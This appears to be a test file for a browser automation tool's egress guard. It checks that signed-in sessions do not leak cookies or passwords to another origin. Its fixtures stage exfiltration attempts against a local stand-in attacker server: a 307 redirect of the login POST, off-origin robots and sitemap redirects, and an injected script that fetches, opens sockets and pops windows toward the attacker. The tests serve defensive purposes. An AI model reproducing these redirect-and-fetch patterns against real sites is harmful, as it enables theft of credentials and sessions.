/**
 * Signed-in egress through the real runner and replay, which also install
 * the submission guard. The other origin must not receive the cookie.
 */

import { createServer, type IncomingMessage, type ServerResponse } from 'node:http';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { chromium } from 'playwright';
import { addressIsNonPublic } from '../src/auth/origins.js';
import { createMemorySecretProvider, establishFormAuth, openFencedContext } from '../src/index.js';
import { explore } from '../src/explorer/index.js';
import { runPlan } from '../src/runner/index.js';
import { replayTraces } from '../src/runner/replay.js';
import { verifyBugs } from '../src/verify/index.js';
import type { LLM } from '../src/llm/index.js';
import type { AuthStorageState } from '../src/auth/contract.js';
import type { TestPlan } from '../src/types.js';

const COOKIE = 'fixture-session-cookie-value';
const PASSWORD = 'synthetic-pass-9';

function listen(handler: (req: IncomingMessage, res: ServerResponse) => void) {
  const server = createServer(handler);
  return new Promise<{ origin: string; close: () => Promise<void> }>((resolve, reject) => {
    server.listen(0, '127.0.0.1', () => {
      const address = server.address();
      if (!address || typeof address === 'string') {
        reject(new Error('no port'));
        return;
      }
      resolve({
        origin: `http://127.0.0.1:${address.port}`,
        close: () => new Promise(done => server.close(() => done())),
      });
    });
  });
}

const llm = {
  providerLabel: 'stub',
  async generateJSON() {
    return {
      tool: 'noop',
      target: 'page',
      rationale: 'stay',
      siteType: 'app',
      summary: 'Synthetic page.',
    };
  },
} as LLM;

describe('composed signed-in egress', () => {
  let appOrigin = '';
  let attackerOrigin = '';
  let closeAll: () => Promise<void> = async () => {};
  let hits = 0;
  const attackerBodies: string[] = [];

  beforeAll(async () => {
    const attacker = await listen(async (req, res) => {
      const chunks: Buffer[] = [];
      for await (const chunk of req) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
      attackerBodies.push(`${req.method || ''} ${req.url || ''} ${Buffer.concat(chunks).toString('utf8')}`);
      hits += 1;
      res.writeHead(204);
      res.end();
    });
    const app = await listen(async (req, res) => {
      const url = new URL(req.url || '/', appOrigin || 'http://127.0.0.1');
      if (url.pathname === '/rebind' && req.method === 'POST') {
        res.writeHead(307, { location: `${attackerOrigin}/kept` });
        res.end();
        return;
      }
      if (url.pathname === '/login') {
        res.writeHead(200, { 'content-type': 'text/html' });
        res.end('<!doctype html><form method="POST" action="/rebind"><input name="email" type="email"><input name="password" type="password"><button type="submit">Sign in</button></form>');
        return;
      }
      if (url.pathname === '/robots.txt') {
        res.writeHead(302, { location: `${attackerOrigin}/robots` });
        res.end();
        return;
      }
      if (url.pathname === '/sitemap.xml') {
        res.writeHead(200, { 'content-type': 'application/xml' });
        res.end(`<?xml version="1.0"?><sitemapindex><sitemap><loc>${appOrigin}/nested.xml</loc></sitemap></sitemapindex>`);
        return;
      }
      if (url.pathname === '/nested.xml') {
        res.writeHead(302, { location: `${attackerOrigin}/nested` });
        res.end();
        return;
      }
      if (url.pathname === '/sw.js') {
        res.writeHead(200, { 'content-type': 'application/javascript' });
        res.end('self.addEventListener("fetch", function () {});');
        return;
      }
      res.writeHead(200, { 'content-type': 'text/html' });
      res.end(`<!doctype html><p>Home</p>
        <iframe src="${attackerOrigin}/frame"></iframe>
        <script>
          fetch(${JSON.stringify(attackerOrigin + '/fetch')});
          try { new WebSocket(${JSON.stringify(attackerOrigin.replace('http', 'ws') + '/sock')}); } catch (e) {}
          window.open(${JSON.stringify(attackerOrigin + '/popup')});
        </script>`);
    });
    appOrigin = app.origin;
    attackerOrigin = attacker.origin;
    closeAll = async () => { await app.close(); await attacker.close(); };
  });

  afterAll(async () => { await closeAll(); });

  function jar(): AuthStorageState {
    return {
      cookies: [{
        name: 'session', value: COOKIE, domain: '127.0.0.1', path: '/',
        expires: -1, httpOnly: true, secure: false, sameSite: 'Lax',
      }],
      origins: [],
    };
  }

  function plan(): TestPlan {
    return {
      startUrl: `${appOrigin}/home`,
      siteType: 'app',
      auth: {
        schema: 1,
        mode: 'session',
        outcome: 'authenticated',
        status: 'authenticated',
        targetOrigin: appOrigin,
        idpOrigins: [],
        sessionReused: false,
        loginCapture: 'disabled',
        runCapture: 'disabled',
        visibility: 'private',
        privateDataScrubbed: false,
        custody: 'customer-local',
        hostedProduct: false,
        interaction: 'read-mostly',
        detail: 'fixture',
      },
      flows: [{
        id: 'visit',
        name: 'Visit',
        description: 'open',
        kind: 'happy_path',
        startUrl: `${appOrigin}/home`,
        steps: [{ action: 'Look at the home page' }],
        expectation: 'Home is visible',
        outcomeCheck: { kind: 'text_visible', value: 'Home' },
        severityIfFails: 'minor',
      }],
    };
  }

  it('blocks off-origin frame, fetch, popup, and websocket inside runPlan', async () => {
    hits = 0;
    const dir = mkdtempSync(join(tmpdir(), 'mt-egress-'));
    await runPlan(plan(), llm, {
      screenshotsDir: dir,
      headless: true,
      recordVideo: false,
      storageState: jar(),
      authOrigin: { targetOrigin: appOrigin, idpOrigins: [] },
    });
    await new Promise(resolve => setTimeout(resolve, 400));
    expect(hits).toBe(0);
  });

  it('blocks the same traffic inside replayTraces', async () => {
    hits = 0;
    const dir = mkdtempSync(join(tmpdir(), 'mt-replay-'));
    await replayTraces([{
      version: 1,
      flowId: 'visit',
      name: 'Visit',
      startUrl: `${appOrigin}/home`,
      steps: [{ index: 0, action: 'Open', tool: 'goto', target: `${appOrigin}/home`, status: 'passed' }],
    }], {
      screenshotsDir: dir,
      headless: true,
      recordVideo: false,
      storageState: jar(),
      authOrigin: { targetOrigin: appOrigin, idpOrigins: [] },
    });
    await new Promise(resolve => setTimeout(resolve, 400));
    expect(hits).toBe(0);
  });

  it('does not run a signed-in plan or replay without a new session', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'mt-noses-'));
    const blocked = await runPlan(plan(), llm, { screenshotsDir: dir, headless: true, recordVideo: false });
    expect(blocked.outcome_reason).toBe('auth_not_authorized');
    expect(blocked.bugs).toEqual([]);
    const replayed = await replayTraces([{
      version: 1,
      flowId: 'visit', name: 'Visit', startUrl: appOrigin,
      steps: [{ index: 0, action: 'Open', tool: 'goto', target: `${appOrigin}/home`, status: 'passed' }],
    }], {
      screenshotsDir: dir,
      headless: true,
      recordVideo: false,
      priorAuth: plan().auth,
    });
    expect(replayed.outcome_reason).toBe('auth_not_authorized');
  });

  it('does not deliver a 307 login body to the other origin', async () => {
    hits = 0;
    attackerBodies.length = 0;
    const result = await establishFormAuth({
      targetUrl: `${appOrigin}/login`,
      provider: createMemorySecretProvider({ username: 'ada@example.test', password: PASSWORD }),
      headless: true,
      postLoginUrl: '/app',
    });
    expect(result.ok).toBe(false);
    expect(JSON.stringify(result)).not.toContain(PASSWORD);
    expect(attackerBodies.join('\n')).not.toContain(PASSWORD);
    expect(hits).toBe(0);
  });

  it('does not follow an off-origin sitemap or robots redirect while signed in', async () => {
    hits = 0;
    await explore(`${appOrigin}/home`, llm, {
      maxPages: 1,
      headless: true,
      pageTimeoutMs: 8_000,
      storageState: jar(),
      authOrigin: { targetOrigin: appOrigin, idpOrigins: [] },
    });
    expect(hits).toBe(0);
  });

  it('blocks service worker registration in a signed-in context', async () => {
    const browser = await chromium.launch({ headless: true });
    try {
      const context = await openFencedContext(browser, {
        storageState: jar(),
        authOrigin: { targetOrigin: appOrigin, idpOrigins: [] },
      });
      const page = await context.newPage();
      await page.goto(`${appOrigin}/plain`, { waitUntil: 'domcontentloaded' });
      const info = await page.evaluate(async () => {
        const registration = await navigator.serviceWorker.register('/sw.js');
        const list = await navigator.serviceWorker.getRegistrations();
        return {
          isRegistration: Boolean(registration && (registration as { scope?: string }).scope),
          count: list.length,
        };
      });
      expect(info.isRegistration).toBe(false);
      expect(info.count).toBe(0);
    } finally {
      await browser.close();
    }
  });

  it('blocks the same traffic inside verifyBugs', async () => {
    hits = 0;
    const dir = mkdtempSync(join(tmpdir(), 'mt-verify-'));
    await verifyBugs({
      startUrl: `${appOrigin}/home`,
      startedAt: new Date().toISOString(),
      finishedAt: new Date().toISOString(),
      flows: [],
      bugs: [{
        id: 'b1',
        fingerprint: 'abc',
        title: 'Home',
        severity: 'minor',
        affectedFlow: 'Visit',
        reproSteps: ['Open home'],
        observed: 'Home',
        expected: 'Home',
        evidence: { screenshots: [], consoleErrors: [], networkFailures: [] },
        triageNotes: 'fixture',
        trace: {
          flowId: 'visit',
          startUrl: `${appOrigin}/home`,
          steps: [{ index: 0, action: 'Open', tool: 'goto', target: `${appOrigin}/home`, status: 'passed' }],
        },
      }],
      stats: {
        flowsTotal: 0, flowsPassed: 0, flowsFailed: 0, flowsBlocked: 0, flowsInconclusive: 0,
        stepsTotal: 0, stepsPassed: 0, stepsFailed: 0,
        bugsCritical: 0, bugsMajor: 0, bugsMinor: 0,
      },
      auth: plan().auth,
    }, {
      screenshotsDir: dir,
      headless: true,
      recordVideo: false,
      storageState: jar(),
      authOrigin: { targetOrigin: appOrigin, idpOrigins: [] },
    });
    await new Promise(resolve => setTimeout(resolve, 400));
    expect(hits).toBe(0);
  });

  it('blocks an off-origin fetch when the page route calls continue', async () => {
    hits = 0;
    const browser = await chromium.launch({ headless: true });
    try {
      const context = await openFencedContext(browser, {
        storageState: jar(),
        authOrigin: { targetOrigin: appOrigin, idpOrigins: [] },
      });
      const page = await context.newPage();
      await page.route('**/*', route => route.continue());
      await page.goto(`${appOrigin}/home`, { waitUntil: 'domcontentloaded' }).catch(() => {});
      await page.waitForTimeout(400);
      expect(hits).toBe(0);
      await context.close();
    } finally {
      await browser.close();
    }
  });
});

describe('address classification', () => {
  it('rejects private, mapped, documentation, and link-local addresses', () => {
    for (const ip of [
      '127.0.0.1', '10.1.2.3', '192.168.1.9', '172.16.0.4', '169.254.169.254',
      '100.64.1.1', '0.0.0.0', '192.0.2.10', '198.51.100.4', '203.0.113.8',
      '224.0.0.1', '255.255.255.255', '::1', 'fe80::1', 'fc00::1', 'ff02::1',
      '::ffff:127.0.0.1', '::ffff:7f00:1', '2001:db8::1',
    ]) {
      expect(addressIsNonPublic(ip), ip).toBe(true);
    }
    expect(addressIsNonPublic('1.1.1.1')).toBe(false);
    expect(addressIsNonPublic('8.8.8.8')).toBe(false);
    expect(addressIsNonPublic('fe9a::1')).toBe(true);
    expect(addressIsNonPublic('192.0.0.8')).toBe(true);
    expect(addressIsNonPublic('192.88.99.1')).toBe(true);
    expect(addressIsNonPublic('::ffff:10.1.2.3')).toBe(true);
    expect(addressIsNonPublic('::ffff:0808:0808')).toBe(false);
  });

  it('pins the resolved addresses and denies a later private lookup', async () => {
    const { prepareEgress, connectionAllowed, setEgressLookupForTests } = await import('../src/auth/egress.js');
    const answers = new Map<string, string[]>([['app.example.test', ['93.184.216.34']]]);
    setEgressLookupForTests(async host => answers.get(host) ?? []);
    try {
      const policy = { targetOrigin: 'https://app.example.test', idpOrigins: [] };
      const prepared = await prepareEgress(policy);
      expect(prepared.ok).toBe(true);
      if (!prepared.ok) return;
      expect(prepared.launchArgs.join(' ')).toContain('MAP app.example.test 93.184.216.34');
      answers.set('app.example.test', ['10.1.2.3']);
      expect(await connectionAllowed(new URL('https://app.example.test/home'), policy, prepared.pin)).toBe(false);
      const loop = await prepareEgress({ targetOrigin: 'http://127.0.0.1:9', idpOrigins: [] });
      expect(loop.ok).toBe(true);
      if (loop.ok) expect(loop.pin.mode).toBe('local-loopback');
    } finally {
      setEgressLookupForTests(undefined);
    }
  });
});
